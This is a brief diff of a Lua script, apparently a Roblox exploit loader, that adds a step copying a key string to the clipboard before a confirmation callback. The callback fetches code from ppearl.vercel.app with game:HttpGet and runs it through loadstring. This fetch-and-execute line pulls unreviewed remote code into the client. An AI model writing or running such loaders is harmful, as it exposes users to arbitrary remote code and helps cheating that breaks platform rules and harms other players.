@@ -10,6 +10,8 @@ Notification:Notify(
         ImageColor = Color3.fromRGB(255, 84, 84),
         Callback = function(State)
             if State then
+                setclipboard("Pearl_876tsdfhba67sdbhyaggv2")
+                wait(0.1)
                 loadstring(game:HttpGet('https://ppearl.vercel.app'))()
             else
                 Notification:Notify(
